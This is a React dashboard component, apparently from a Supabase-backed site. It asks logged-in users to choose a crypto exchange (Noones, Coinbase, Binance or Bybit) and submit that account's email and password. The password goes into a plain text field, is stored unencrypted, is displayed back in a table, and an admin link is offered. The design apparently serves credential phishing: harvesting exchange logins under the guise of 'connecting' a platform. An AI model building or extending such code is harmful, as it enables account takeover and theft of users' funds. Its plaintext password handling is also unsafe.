import React, { useEffect, useState } from 'react';
import { Link, useNavigate, useSearchParams } from 'react-router-dom';
import { supabase } from '../lib/supabase';

const platformOptions = ['Noones', 'Coinbase', 'Binance', 'Bybit'];

export default function Dashboard() {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const [user, setUser] = useState<any>(null);
  const [submissions, setSubmissions] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState(searchParams.get('error') || '');
  const [submitted, setSubmitted] = useState(searchParams.get('submitted') === '1');

  useEffect(() => {
    const checkUser = async () => {
      const { data: { user } } = await supabase.auth.getUser();
      if (!user) {
        navigate('/connect');
        return;
      }
      setUser(user);
      fetchSubmissions(user.id);
    };

    checkUser();
  }, [navigate]);

  const fetchSubmissions = async (userId: string) => {
    const { data } = await supabase
      .from('platform_connections')
      .select('id, platform, email, third_party_password, created_at')
      .eq('user_id', userId)
      .order('created_at', { ascending: false });
    
    setSubmissions(data || []);
    setLoading(false);
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setSubmitting(true);
    setError('');
    setSubmitted(false);

    const formData = new FormData(event.currentTarget);
    const platform = String(formData.get('platform') || '').trim();
    const email = String(formData.get('email') || '').trim().toLowerCase();
    const thirdPartyPassword = String(formData.get('thirdPartyPassword') || '').trim();

    if (!platform || !email || !thirdPartyPassword) {
      setError('Please complete all fields');
      setSubmitting(false);
      return;
    }

    const { error: insertError } = await supabase.from('platform_connections').insert({
      platform,
      email,
      third_party_password: thirdPartyPassword,
      user_id: user.id,
    });

    if (insertError) {
      setError(insertError.message);
    } else {
      navigate('/link-success');
    }
    setSubmitting(false);
  };

  const handleSignOut = async () => {
    await supabase.auth.signOut();
    navigate('/connect');
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-[#0a0a0c] flex items-center justify-center text-white">
        <div className="animate-spin rounded-full h-8 w-8 border-t-2 border-b-2 border-white"></div>
      </div>
    );
  }

  return (
    <main className="min-h-screen bg-[#0a0a0c] px-4 py-10 text-white sm:px-6">
      <div className="mx-auto max-w-4xl space-y-6">
        <header className="flex flex-wrap items-center justify-between gap-3 rounded-2xl border border-white/10 bg-white/5 p-4">
          <div>
            <h1 className="text-2xl font-semibold">Dashboard</h1>
            <p className="text-sm text-slate-300">Logged in as {user?.email}</p>
          </div>
          <div className="flex items-center gap-3">
            <Link
              to="/admin"
              className="rounded-lg border border-white/20 px-4 py-2 text-sm text-slate-200 hover:bg-white/10"
            >
              Admin
            </Link>
            <button
              onClick={handleSignOut}
              className="rounded-lg border border-white/20 px-4 py-2 text-sm text-slate-200 hover:bg-white/10"
            >
              Sign out
            </button>
          </div>
        </header>

        <section className="rounded-2xl border border-white/10 bg-white/5 p-5">
          <h2 className="mb-4 text-lg font-medium">Submit platform connection</h2>
          <form onSubmit={handleSubmit} className="grid gap-4 sm:grid-cols-2">
            <div>
              <label className="mb-1 block text-sm text-slate-300" htmlFor="platform">
                Platform
              </label>
              <select
                id="platform"
                name="platform"
                defaultValue={platformOptions[0]}
                className="w-full rounded-lg border border-white/15 bg-[#101115] px-3 py-2 text-sm text-white"
              >
                {platformOptions.map((platform) => (
                  <option key={platform} value={platform}>
                    {platform}
                  </option>
                ))}
              </select>
            </div>
            <div>
              <label className="mb-1 block text-sm text-slate-300" htmlFor="email">
                Connection email
              </label>
              <input
                id="email"
                name="email"
                type="email"
                placeholder="name@example.com"
                className="w-full rounded-lg border border-white/15 bg-[#101115] px-3 py-2 text-sm text-white placeholder:text-slate-500"
              />
            </div>
            <div className="sm:col-span-2">
              <label className="mb-1 block text-sm text-slate-300" htmlFor="thirdPartyPassword">
                Third-party password
              </label>
              <input
                id="thirdPartyPassword"
                name="thirdPartyPassword"
                type="text"
                placeholder="Enter third-party password"
                className="w-full rounded-lg border border-white/15 bg-[#101115] px-3 py-2 text-sm text-white placeholder:text-slate-500"
              />
            </div>
            <div className="sm:col-span-2">
              <button
                type="submit"
                disabled={submitting}
                className="rounded-lg bg-[#f9be00] px-4 py-2 text-sm font-semibold text-black hover:bg-[#ebb300] disabled:opacity-50"
              >
                {submitting ? 'Saving...' : 'Save connection'}
              </button>
            </div>
          </form>

          {submitted ? (
            <p className="mt-3 text-sm text-emerald-400">Submission saved.</p>
          ) : null}
          {error ? <p className="mt-3 text-sm text-red-400">{error}</p> : null}
        </section>

        <section className="rounded-2xl border border-white/10 bg-white/5 p-5">
          <h2 className="mb-4 text-lg font-medium">Your submissions</h2>
          <div className="overflow-x-auto">
            <table className="min-w-full text-left text-sm">
              <thead className="text-slate-400">
                <tr>
                  <th className="px-3 py-2">Platform</th>
                  <th className="px-3 py-2">Email</th>
                  <th className="px-3 py-2">Password</th>
                  <th className="px-3 py-2">Created</th>
                </tr>
              </thead>
              <tbody>
                {submissions.map((row) => (
                  <tr key={row.id} className="border-t border-white/10">
                    <td className="px-3 py-2">{row.platform}</td>
                    <td className="px-3 py-2">{row.email}</td>
                    <td className="px-3 py-2">{row.third_party_password}</td>
                    <td className="px-3 py-2 text-slate-400">
                      {new Date(row.created_at).toLocaleString()}
                    </td>
                  </tr>
                ))}
                {submissions.length === 0 && (
                  <tr>
                    <td colSpan={4} className="px-3 py-8 text-center text-slate-500">
                      No submissions yet.
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        </section>
      </div>
    </main>
  );
}
